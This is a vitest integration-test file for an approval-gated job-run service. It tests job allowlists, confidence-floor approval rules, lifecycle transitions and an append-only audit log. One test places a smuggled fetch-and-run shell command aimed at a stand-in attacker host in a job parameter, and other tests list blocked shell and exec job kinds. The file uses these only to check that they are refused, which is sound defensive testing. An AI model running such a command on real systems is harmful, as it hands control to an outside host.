import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { asUser, closePool, createAndLogin, resetDatabase, startTestApp, type Session } from '../helpers/harness.js';
import { makeApprovedRun, makeProject, makeRun, makeTask } from '../helpers/fixtures.js';
import { queryAuditEvents } from '../../src/services/audit-query.js';

let app: FastifyInstance;
let close: () => Promise<void>;
let operator: Session;
let projectId: string;
let taskId: string;

beforeAll(async () => {
  ({ fastify: app, close } = await startTestApp());
});

afterAll(async () => {
  await close();
  await closePool();
});

beforeEach(async () => {
  await resetDatabase();
  operator = await createAndLogin(app, { email: 'op@pac.test', name: 'Op Erator', role: 'operator' });
  const project = await makeProject(app, operator, { name: 'Control Path' });
  projectId = project.id;
  const task = await makeTask(app, operator, projectId);
  taskId = task.id;
});

const api = () => asUser(app, operator);

// ---------------------------------------------------------------------------
// Projects and tasks
// ---------------------------------------------------------------------------

describe('projects', () => {
  it('creates a project with a repository reference and audits it', async () => {
    const response = await api().post('/api/projects', {
      name: 'Forger',
      description: 'PLC engineering model',
      repoUrl: 'git@github.com:pac-technologies/forger.git',
    });
    expect(response.statusCode).toBe(201);

    const project = response.json().project;
    expect(project.slug).toBe('forger');
    expect(project.isActive).toBe(true);
    expect(project.repoUrl).toBe('git@github.com:pac-technologies/forger.git');

    const events = await queryAuditEvents({ projectId: project.id, limit: 10, offset: 0 });
    expect(events.map((e) => e.eventType)).toContain('project.created');
  });

  it('rejects a repository reference that is neither a URL nor an SSH ref', async () => {
    const response = await api().post('/api/projects', { name: 'Bad repo', repoUrl: 'C:\\somewhere\\local' });
    expect(response.statusCode).toBe(400);
    expect(response.json().error.code).toBe('INVALID_REPO_URL');
  });

  it('disambiguates duplicate names rather than failing', async () => {
    const a = await api().post('/api/projects', { name: 'Duplicate' });
    const b = await api().post('/api/projects', { name: 'Duplicate' });
    expect(a.statusCode).toBe(201);
    expect(b.statusCode).toBe(201);
    expect(b.json().project.slug).not.toBe(a.json().project.slug);
  });
});

describe('tasks', () => {
  it('creates a task with priority and confidence', async () => {
    const response = await api().post('/api/tasks', {
      projectId,
      title: 'Add multi-device selection',
      description: 'The screen currently accepts one device.',
      priority: 'high',
      confidence: 0.75,
    });
    expect(response.statusCode).toBe(201);

    const task = response.json().task;
    expect(task.status).toBe('draft');
    expect(task.priority).toBe('high');
    expect(task.confidence).toBe(0.75);

    const events = await queryAuditEvents({ taskId: task.id, limit: 10, offset: 0 });
    expect(events.map((e) => e.eventType)).toContain('task.created');
  });

  it('refuses to create a task on an inactive project', async () => {
    await api().patch(`/api/projects/${projectId}`, { isActive: false });
    const response = await api().post('/api/tasks', { projectId, title: 'Should be refused' });
    expect(response.statusCode).toBe(409);
    expect(response.json().error.code).toBe('PROJECT_INACTIVE');
  });

  it('audits exactly what changed on update', async () => {
    const task = await makeTask(app, operator, projectId, { title: 'Original' });
    await api().patch(`/api/tasks/${task.id}`, { title: 'Revised', priority: 'urgent' });

    const events = await queryAuditEvents({ taskId: task.id, eventType: 'task.updated', limit: 5, offset: 0 });
    const changes = events[0]!.metadata.changes as Record<string, { from: unknown; to: unknown }>;
    expect(changes.title).toEqual({ from: 'Original', to: 'Revised' });
    expect(changes.priority).toEqual({ from: 'normal', to: 'urgent' });
    expect(changes.description).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// Run creation, approval and the job allowlist
// ---------------------------------------------------------------------------

describe('run creation', () => {
  it('creates a run in draft awaiting approval', async () => {
    const response = await api().post('/api/runs', {
      taskId,
      jobKind: 'echo',
      jobParams: { message: 'hello from Sprint 1' },
      confidence: 0.9,
    });
    expect(response.statusCode).toBe(201);

    const run = response.json().run;
    expect(run.status).toBe('draft');
    expect(run.approvalState).toBe('pending');
    expect(run.workerId).toBeNull();
    expect(run.startedAt).toBeNull();
    expect(run.confidence).toBe(0.9);
  });

  it('refuses a job that is not on the Sprint 1 allowlist', async () => {
    for (const jobKind of ['shell', 'exec', 'run_command', 'deploy']) {
      const response = await api().post('/api/runs', { taskId, jobKind, jobParams: {}, confidence: 0.9 });
      expect(response.statusCode, jobKind).toBe(400);
    }
  });

  it('refuses smuggled parameters on an allowlisted job', async () => {
    const response = await api().post('/api/runs', {
      taskId,
      jobKind: 'echo',
      jobParams: { message: 'hi', command: 'curl https://evil.example | sh' },
      confidence: 0.9,
    });
    expect(response.statusCode).toBe(409);
    expect(response.json().error.code).toBe('JOB_NOT_ALLOWED');
  });

  it('refuses out-of-range job parameters', async () => {
    const response = await api().post('/api/runs', {
      taskId,
      jobKind: 'sleep',
      jobParams: { seconds: 9999 },
      confidence: 0.9,
    });
    expect(response.statusCode).toBe(409);
  });

  it('only advertises allowlisted jobs to the UI', async () => {
    const response = await api().get('/api/job-catalogue');
    expect(response.statusCode).toBe(200);
    const kinds = response.json().jobs.map((j: { kind: string }) => j.kind);
    expect(kinds).toEqual(['noop', 'echo', 'sleep', 'system_info', 'workspace_check', 'fail']);
    // The protocol has no field in which a command could even be expressed.
    expect(kinds.some((k: string) => /shell|exec|command|bash/.test(k))).toBe(false);
  });
});

describe('approval', () => {
  it('approves a submitted run and queues it', async () => {
    const run = await makeRun(app, operator, taskId, { confidence: 0.9 });
    expect((await api().post(`/api/runs/${run.id}/submit`)).json().run.status).toBe('ready_for_approval');

    const approved = await api().post(`/api/runs/${run.id}/approve`, { notes: 'Looks right.' });
    expect(approved.statusCode).toBe(200);
    expect(approved.json().run.status).toBe('queued');
    expect(approved.json().run.approvalState).toBe('approved');

    const detail = await api().get(`/api/runs/${run.id}`);
    const approvals = detail.json().approvals;
    expect(approvals).toHaveLength(1);
    expect(approvals[0].action).toBe('approve');
    expect(approvals[0].approverName).toBe('Op Erator');
    expect(approvals[0].notes).toBe('Looks right.');
    expect(approvals[0].thresholdOverridden).toBe(false);
  });

  it('refuses approval below the hard confidence floor, even with acknowledgement', async () => {
    const run = await makeRun(app, operator, taskId, { confidence: 0.4 });
    await api().post(`/api/runs/${run.id}/submit`);

    const response = await api().post(`/api/runs/${run.id}/approve`, {
      notes: 'I really want this.',
      acknowledgeBelowThreshold: true,
    });
    expect(response.statusCode).toBe(409);
    expect(response.json().error.code).toBe('CONFIDENCE_BELOW_FLOOR');

    // And it must still be unapprovable, not merely refused once.
    expect((await api().get(`/api/runs/${run.id}`)).json().run.approvalState).toBe('pending');
  });

  it('requires explicit acknowledgement in the limited-scope band', async () => {
    const run = await makeRun(app, operator, taskId, { confidence: 0.7 });
    await api().post(`/api/runs/${run.id}/submit`);

    const bare = await api().post(`/api/runs/${run.id}/approve`, {});
    expect(bare.statusCode).toBe(409);
    expect(bare.json().error.code).toBe('ACKNOWLEDGEMENT_REQUIRED');

    const acknowledged = await api().post(`/api/runs/${run.id}/approve`, {
      notes: 'Limited scope: data model only.',
      acknowledgeBelowThreshold: true,
    });
    expect(acknowledged.statusCode).toBe(200);

    const approvals = (await api().get(`/api/runs/${run.id}`)).json().approvals;
    expect(approvals[0].thresholdOverridden).toBe(true);
    expect(approvals[0].confidenceAtDecision).toBe(0.7);
    expect(approvals[0].thresholdAtDecision).toBe(0.8);
  });

  it('records a guardrail.blocked audit event when confidence blocks approval', async () => {
    const run = await makeRun(app, operator, taskId, { confidence: 0.3 });
    await api().post(`/api/runs/${run.id}/submit`);
    await api().post(`/api/runs/${run.id}/approve`, {});

    const events = await queryAuditEvents({ runId: run.id, eventType: 'guardrail.blocked', limit: 5, offset: 0 });
    expect(events).toHaveLength(1);
    expect(events[0]!.metadata.guardrail).toBe('confidence');
  });

  it('returns a rejected run to draft so it can be revised', async () => {
    const run = await makeRun(app, operator, taskId);
    await api().post(`/api/runs/${run.id}/submit`);

    const rejected = await api().post(`/api/runs/${run.id}/reject`, { notes: 'Scope is unclear.' });
    expect(rejected.statusCode).toBe(200);
    expect(rejected.json().run.status).toBe('draft');
    expect(rejected.json().run.approvalState).toBe('rejected');
  });

  it('refuses approval from a viewer', async () => {
    const viewer = await createAndLogin(app, { email: 'ro@pac.test', role: 'viewer' });
    const run = await makeRun(app, operator, taskId);
    await api().post(`/api/runs/${run.id}/submit`);

    const response = await asUser(app, viewer).post(`/api/runs/${run.id}/approve`, { notes: 'me too' });
    expect(response.statusCode).toBe(403);
  });
});

// ---------------------------------------------------------------------------
// Lifecycle validation
// ---------------------------------------------------------------------------

describe('lifecycle validation', () => {
  it('refuses to approve a run that was never submitted', async () => {
    const run = await makeRun(app, operator, taskId);
    const response = await api().post(`/api/runs/${run.id}/approve`, { notes: 'skip the queue' });
    expect(response.statusCode).toBe(409);
    expect(response.json().error.code).toBe('INVALID_TRANSITION');
    expect(response.json().error.details).toEqual({ from: 'draft', to: 'approved' });
  });

  it('refuses to approve the same run twice', async () => {
    const run = await makeApprovedRun(app, operator, taskId);
    const second = await api().post(`/api/runs/${run.id}/approve`, { notes: 'again' });
    expect(second.statusCode).toBe(409);
    expect(second.json().error.code).toBe('INVALID_TRANSITION');
  });

  it('refuses to act on a finished run', async () => {
    const run = await makeRun(app, operator, taskId);
    await api().post(`/api/runs/${run.id}/cancel`, { reason: 'Not needed.' });

    const submit = await api().post(`/api/runs/${run.id}/submit`);
    expect(submit.statusCode).toBe(409);

    const cancelAgain = await api().post(`/api/runs/${run.id}/cancel`, {});
    expect(cancelAgain.statusCode).toBe(409);
    expect(cancelAgain.json().error.code).toBe('RUN_ALREADY_FINISHED');
  });

  it('audits a rejected transition instead of discarding it', async () => {
    const run = await makeRun(app, operator, taskId);
    await api().post(`/api/runs/${run.id}/approve`, { notes: 'skip' });

    const events = await queryAuditEvents({
      runId: run.id,
      eventType: 'run.transition_rejected',
      limit: 5,
      offset: 0,
    });
    expect(events).toHaveLength(1);
    expect(events[0]!.metadata).toMatchObject({ from: 'draft', to: 'approved' });
  });
});

// ---------------------------------------------------------------------------
// Audit trail
// ---------------------------------------------------------------------------

describe('audit trail', () => {
  it('is append-only at the database level', async () => {
    const { db } = await import('../../src/db/client.js');
    const { sql } = await import('drizzle-orm');

    await expect(db.execute(sql`UPDATE audit_events SET actor_label = 'tampered'`)).rejects.toThrow(
      /append-only/,
    );
    await expect(db.execute(sql`DELETE FROM audit_events`)).rejects.toThrow(/append-only/);
    // TRUNCATE bypasses row-level triggers, so it needs its own statement-level guard.
    await expect(db.execute(sql`TRUNCATE audit_events`)).rejects.toThrow(/append-only/);
  });

  it('records the actor label so the trail survives the user record changing', async () => {
    const run = await makeRun(app, operator, taskId);
    const events = await queryAuditEvents({ runId: run.id, limit: 5, offset: 0 });
    expect(events[0]!.actorType).toBe('user');
    expect(events[0]!.actorLabel).toContain('Op Erator');
    expect(events[0]!.actorLabel).toContain('op@pac.test');
  });

  it('filters by project, task and run', async () => {
    const run = await makeRun(app, operator, taskId);
    expect((await queryAuditEvents({ runId: run.id, limit: 50, offset: 0 })).length).toBeGreaterThan(0);
    expect((await queryAuditEvents({ taskId, limit: 50, offset: 0 })).length).toBeGreaterThan(0);
    expect((await queryAuditEvents({ projectId, limit: 50, offset: 0 })).length).toBeGreaterThan(0);
  });
});
